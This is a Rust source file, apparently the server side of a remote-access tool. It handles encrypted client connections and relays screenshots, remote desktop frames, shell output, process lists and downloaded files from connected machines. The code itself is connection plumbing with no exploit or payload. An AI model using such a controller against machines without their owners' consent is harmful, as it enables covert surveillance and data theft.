use crate::commands::*;
use common::connection::*;
use common::packets::*;
use tokio::sync::mpsc::{self, Receiver, Sender};
use tokio::sync::oneshot;

use rand::SeedableRng;
use rand_chacha::ChaCha20Rng;
use common::packets::ClientboundPacket;

pub struct ClientWrapper; // Maybe this shouldn't be a struct?

impl ClientWrapper {
    /// Handles incoming connection and spawns reading and writing loops.
    pub async fn spawn(
        socket: tokio::net::TcpStream,
        addr: std::net::SocketAddr,
        ctx: Sender<ServerCommand>,
    ) {
        let (tx, rx) = mpsc::channel::<ClientCommand>(32);
        println!("Connection from: {:?}", addr);
        let connection = Connection::<ServerboundPacket, ClientboundPacket>::new(socket);
        let (reader, writer) = connection.split();
        let reader_wrapped = ClientReaderWrapper::new(reader, addr, tx.clone(), ctx);
        tokio::spawn(reader_wrapped.spawn_loop());
        let writer_wrapped = ClientWriterWrapper::new(writer, rx);
        tokio::spawn(writer_wrapped.spawn_loop());
    }
}

pub struct ClientReaderWrapper {
    reader: ConnectionReader<ServerboundPacket>,
    addr: std::net::SocketAddr,
    client_sender: Sender<ClientCommand>,
    server_sender: Sender<ServerCommand>,
    secret: Option<Vec<u8>>,
    nonce_generator: Option<ChaCha20Rng>,
}

impl ClientReaderWrapper {
    fn new(
        reader: ConnectionReader<ServerboundPacket>,
        addr: std::net::SocketAddr,
        client_sender: Sender<ClientCommand>,
        server_sender: Sender<ServerCommand>,
    ) -> Self {
        Self {
            reader,
            addr,
            client_sender,
            server_sender,
            secret: None,
            nonce_generator: None,
        }
    }

    async fn handle_encryption_request(&mut self) {
        use ServerboundPacket::*;

        let (otx, orx) = oneshot::channel();

        self.server_sender
            .send(ServerCommand::EncryptionRequest(
                self.client_sender.clone(),
                otx,
            ))
            .await
            .unwrap();

        let expect_token = orx.await.unwrap();

        match self
            .reader
            .read_packet(&self.secret, self.nonce_generator.as_mut())
            .await
        {
            Ok(Some(EncryptionConfirm(s, t))) => {
                let (otx, orx) = oneshot::channel();
                self.server_sender
                    .send(ServerCommand::EncryptionConfirm(
                        self.client_sender.clone(),
                        otx,
                        s.clone(),
                        t,
                        expect_token,
                    ))
                    .await
                    .unwrap();

                match orx.await.unwrap() {
                    Ok(s) => {
                        self.secret = Some(s.clone());
                        let mut seed = [0u8; common::SECRET_LEN];
                        seed.copy_from_slice(&s);

                        self.nonce_generator = Some(ChaCha20Rng::from_seed(seed));
                    }
                    Err(_) => {
                        self.client_sender
                            .send(ClientCommand::Close)
                            .await
                            .ok(); // it's ok if already closed
                    }
                }
            }
            Ok(_) => {
                self.client_sender
                    .send(ClientCommand::Close)
                    .await
                    .ok(); // it's ok if already closed
            }
            Err(_) => {
                self.client_sender
                    .send(ClientCommand::Close)
                    .await
                    .ok(); // it's ok if already closed
            }
        };
    }

    async fn send_server_packet(&self, packet: ServerCommand) {
        self.server_sender
            .send(packet)
            .await
            .unwrap_or_else(|e| println!("Failed to send packet {}", e));
    }

    async fn handle_packet(&mut self, packet: ServerboundPacket) {
        use ServerboundPacket::*;
        match packet {
            EncryptionRequest => self.handle_encryption_request().await,
            
            ClientInfo(info) => {
                self.send_server_packet(ServerCommand::RegisterClient(self.client_sender.clone(), self.addr, info)).await;
            },
            
            ScreenshotResult(screenshot_data) => {
                self.send_server_packet(ServerCommand::ScreenshotData(self.addr, screenshot_data)).await;
            },

            RemoteDesktopFrame(frame) => {
                self.send_server_packet(ServerCommand::RemoteDesktopFrame(self.addr, frame)).await;
            },

            ShellOutput(output) => {
                self.send_server_packet(ServerCommand::ShellOutput(self.addr, output)).await;
            },

            ProcessList(process_list) => {
                self.send_server_packet(ServerCommand::ProcessList(self.addr, process_list)).await;
            },

            DisksResult(disks) => {
                self.send_server_packet(ServerCommand::DisksResult(self.addr, disks)).await;
            },

            FileList(files) => {
                self.send_server_packet(ServerCommand::FileList(self.addr, files)).await;
            },

            CurrentFolder(path) => {
                self.send_server_packet(ServerCommand::CurrentFolder(self.addr, path)).await;
            },

            DonwloadFileResult(file_data) => {
                self.send_server_packet(ServerCommand::DownloadFileResult(self.addr, file_data)).await;
            },
            
            EncryptionConfirm(_, _) => {
                println!("Received unexpected EncryptionConfirm packet");
            },

            #[allow(unreachable_patterns)]
            _ => {
                println!("Unhandled packet type: {:?}", packet);
            }
        };
    }

    async fn spawn_loop(mut self) {
        loop {
            match self
                .reader
                .read_packet(&self.secret, self.nonce_generator.as_mut())
                .await
            {
                Ok(p) => {
                    match &p {
                        Some(packet) => {
                            self.handle_packet(packet.clone()).await;
                        },
                        None => println!("Got None packet from {}", self.addr),
                    }

                }
                Err(e) => {
                    println!("Error reading from client {}: {:?}", self.addr, e);
                    if e == "Connection reset by peer" {
                        self.send_server_packet(ServerCommand::ClientDisconnected(self.addr)).await;
                    } else {
                        self.send_server_packet(ServerCommand::ClientDisconnected(self.addr)).await;
                    }
                    break;
                }
            }
        }
    }
}

pub struct ClientWriterWrapper {
    writer: ConnectionWriter<ClientboundPacket>,
    connection_receiver: Receiver<ClientCommand>,
    secret: Option<Vec<u8>>,
    nonce_generator: Option<ChaCha20Rng>,
}

impl ClientWriterWrapper {
    fn new(
        writer: ConnectionWriter<ClientboundPacket>,
        connection_receiver: Receiver<ClientCommand>,
    ) -> Self {
        Self {
            writer,
            connection_receiver,
            secret: None,
            nonce_generator: None,
        }
    }

    async fn spawn_loop(mut self) {
        loop {
            if let Some(com) = self.connection_receiver.recv().await {
                use ClientCommand::*;
                match com {
                    Close => break,
                    SetSecret(s) => {
                        self.secret = s.clone();
                        if let Some(ref secret) = self.secret {
                            let mut seed = [0u8; common::SECRET_LEN];
                            seed.copy_from_slice(&secret[..]);
                            self.nonce_generator = Some(ChaCha20Rng::from_seed(seed));
                        }
                    }
                    Write(p) => {
                        if p == ClientboundPacket::CloseClientSession {
                            break;
                        }

                        self
                        .writer
                        .write_packet(p, &self.secret, self.nonce_generator.as_mut())
                        .await
                        .unwrap_or_else(|e| println!("Error writing packet: {}", e))
                    }
                }
            }
        }
    }
}